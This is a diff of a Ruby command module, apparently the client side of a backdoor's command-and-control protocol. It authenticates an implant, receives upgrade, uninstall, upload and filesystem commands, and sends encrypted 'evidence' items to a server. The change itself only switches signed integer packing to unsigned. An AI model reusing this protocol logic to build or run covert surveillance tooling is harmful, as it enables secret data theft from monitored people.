@@ -108,12 +108,12 @@ module Command
     trace :debug, "Auth -- Response: " << response.unpack('H*').to_s
     
     # print the response
-    trace :info, "Auth Response: OK" if response.unpack('i') == [PROTO_OK]
-    if response.unpack('i') == [PROTO_UNINSTALL] then
+    trace :info, "Auth Response: OK" if response.unpack('I') == [PROTO_OK]
+    if response.unpack('I') == [PROTO_UNINSTALL] then
       trace :info, "UNINSTALL received"
       raise "UNINSTALL"
     end
-    if response.unpack('i') == [PROTO_NO] then
+    if response.unpack('I') == [PROTO_NO] then
       trace :info, "NO received"
       raise "PROTO_NO: cannot continue"
     end
@@ -129,10 +129,10 @@ module Command
     available = []
     
     # prepare the command
-    message = [PROTO_ID].pack('i')
+    message = [PROTO_ID].pack('I')
     
     # prepare the message 
-    message += [backdoor.version].pack('i')
+    message += [backdoor.version].pack('I')
     message += backdoor.userid.pascalize + backdoor.deviceid.pascalize + backdoor.sourceid.pascalize
 
     # send the message and receive the response from the server
@@ -142,7 +142,7 @@ module Command
     #trace "ID -- response: " << resp.unpack('H*').to_s
     
     # parse the response
-    command, tot, time, size, *list = resp.unpack('i2qi*')
+    command, tot, time, size, *list = resp.unpack('I2qI*')
     
     # fill the available array
     if command == PROTO_OK then
@@ -173,7 +173,7 @@ module Command
     resp = send_command(PROTO_CONF)
 
     # decode the response
-    command, size = resp.unpack('i2')
+    command, size = resp.unpack('I2')
     if command == PROTO_OK then
       trace :info, "CONFIG -- #{size} bytes"
       # configuration parser
@@ -192,11 +192,11 @@ module Command
     resp = send_command(PROTO_UPLOAD)
 
     # decode the response
-    command, tot, left, size = resp.unpack('i4')
+    command, tot, left, size = resp.unpack('I4')
     
     if command == PROTO_OK then
       filename = resp[12, resp.length].unpascalize
-      bytes = resp[16 + size, resp.length].unpack('i')
+      bytes = resp[16 + size, resp.length].unpack('I')
       trace :info, "UPLOAD -- [#{filename}] #{bytes} bytes"
       
       # recurse the request if there are other files to request
@@ -214,11 +214,11 @@ module Command
     resp = send_command(PROTO_UPGRADE)
 
     # decode the response
-    command, tot, left, size = resp.unpack('i4')
+    command, tot, left, size = resp.unpack('I4')
 
     if command == PROTO_OK then
       filename = resp[12, resp.length].unpascalize
-      bytes = resp[16 + size, resp.length].unpack('i')
+      bytes = resp[16 + size, resp.length].unpack('I')
       trace :info, "UPGRADE -- [#{filename}] #{bytes} bytes"
 
       # recurse the request if there are other files to request
@@ -236,7 +236,7 @@ module Command
     resp = send_command(PROTO_DOWNLOAD)
     
     # decode the response
-    command, tot, num = resp.unpack('i3')
+    command, tot, num = resp.unpack('I3')
 
     if command == PROTO_OK then
       trace :info, "DOWNLOAD : #{num} are available"
@@ -258,7 +258,7 @@ module Command
     resp = send_command(PROTO_FILESYSTEM)
     
     # decode the response
-    command, tot, num = resp.unpack('i3')
+    command, tot, num = resp.unpack('I3')
 
     if command == PROTO_OK then
       trace :info, "FILESYSTEM : #{num} are available"
@@ -266,7 +266,7 @@ module Command
       # print the list of downloads
       buffer = list
       begin
-        depth, len = buffer.unpack('i2')
+        depth, len = buffer.unpack('I2')
         # len of the current token
         len += 8
         # unpascalize the token
@@ -292,13 +292,13 @@ module Command
     evidence = evidences.shift
     
     # prepare the message
-    message = [PROTO_EVIDENCE].pack('i') + [evidence.size].pack('i') + evidence.content
+    message = [PROTO_EVIDENCE].pack('I') + [evidence.size].pack('I') + evidence.content
     enc_msg = aes_encrypt_integrity(message, @session_key)
     # send the message and receive the response
     resp = @transport.message enc_msg
     resp = aes_decrypt_integrity(resp, @session_key)
     
-    if resp.unpack('i') == [PROTO_OK] then
+    if resp.unpack('I') == [PROTO_OK] then
       trace :info, "EVIDENCE -- [#{evidence.name}] #{evidence.size} bytes sent. #{evidences.size} left"
     else
       trace :info, "EVIDENCE -- problems from server"
@@ -316,12 +316,12 @@ module Command
     trace :info, "BYE"
     resp = send_command(PROTO_BYE)
     
-    trace :info, "BYE Response: OK" if resp.unpack('i') == [PROTO_OK]
+    trace :info, "BYE Response: OK" if resp.unpack('I') == [PROTO_OK]
   end
   
   # helper method
   def send_command(command)
-    message = [command].pack('i')
+    message = [command].pack('I')
 
     # encrypt the message
     enc_msg = aes_encrypt_integrity(message, @session_key)
